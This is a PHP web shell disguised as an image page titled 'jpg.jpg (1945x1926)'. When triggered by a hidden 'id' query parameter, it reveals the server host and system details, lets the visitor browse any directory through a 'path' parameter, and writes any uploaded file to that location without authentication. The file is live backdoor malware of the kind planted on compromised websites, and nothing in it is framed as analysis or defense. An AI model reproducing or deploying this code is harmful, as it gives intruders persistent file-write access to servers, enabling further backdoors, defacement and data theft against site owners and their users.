<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<title>jpg.jpg (1945x1926)</title>
<style>
body {
background-color : black ;
font-family : Kelly Slab ;
color : white ;
}
a {
font-family : Kelly Slab ;
color : white ;
}
.tengahken {
position : absolute ;
margin : auto ;
height : 50% ;
top : 0 ; bottom : 0 ; left : 0 ; right : 0 ;
}
</style>
<?php
if(isset($_GET['id'])) {

echo '<div class="tengahken">
<center>';
echo '<font>site : '.$_SERVER['HTTP_HOST'].' </font><br>
<font>system : '.php_uname().'</font><br><br>
<b>root@god:~# ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?id&path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?id&path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '<br><br><form enctype="multipart/form-data" method="POST">
<input type="file" name="file" style="font-family : Kelly Slab ; background : transparent ; color : gold ; border : 2px solid silver ;"/>
<input type="submit" value="Upload" style="width : 150px ; font-family : Kelly Slab ; background : transparent ; color : gold ; border:3px solid silver ;"/><br>
</form></center><br>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
$web = "http://".$_SERVER['HTTP_HOST']."";
$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);
$files = $_FILES['file']['name'];
echo '<font color="lime"><center><b>UPLOADD SUCCESS!!!! --> </font></b><a href="'.$full.'/'.$files.'">'.$web.''.$full.'/'.$files.'';
}
else {
echo '<script> alert ("file '.$files.' gagal di uplad") </script>';
}
}
}
?>
